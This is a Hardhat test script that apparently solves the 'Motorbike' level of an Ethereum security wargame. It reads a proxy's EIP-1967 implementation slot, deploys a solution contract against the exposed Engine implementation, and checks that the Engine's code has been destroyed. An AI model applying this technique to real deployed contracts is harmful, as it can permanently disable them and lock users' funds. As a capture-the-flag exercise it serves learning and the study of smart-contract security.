const { ethers } = require("hardhat")
const { assert } = require("chai")

/* 
    Enter the contract address below.
    Use `await contract.address in the console to get the address.
*/
const CONTRACT_ADDRESS = "0x748F4640E130d34C8AbCEEedb9fEf037Dcb324DC"

describe("25 Motorbike", function () {
    let player, solutionContract, challengeContract, engineAddress

    before(async function () {
        ;[player] = await ethers.getSigners()
        engineAddress =
            "0x" +
            (
                await ethers.provider.getStorageAt(
                    CONTRACT_ADDRESS,
                    "0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc"
                )
            ).slice(26)
        challengeContract = await ethers.getContractAt(
            "Engine",
            engineAddress,
            player
        )
        solutionContract = await (
            await ethers.getContractFactory("MotorbikeSolution", player)
        ).deploy(engineAddress)
        const contractBefore = await ethers.provider.getCode(engineAddress)
        assert.notEqual(contractBefore.toString(), "0x")
    })

    it("Execution", async function () {
        const txResponse = await solutionContract.solveChallenge()
        await txResponse.wait(1)
    })

    after(async function () {
        const contractAfter = await ethers.provider.getCode(engineAddress)
        assert.equal(contractAfter.toString(), "0x")
    })
})
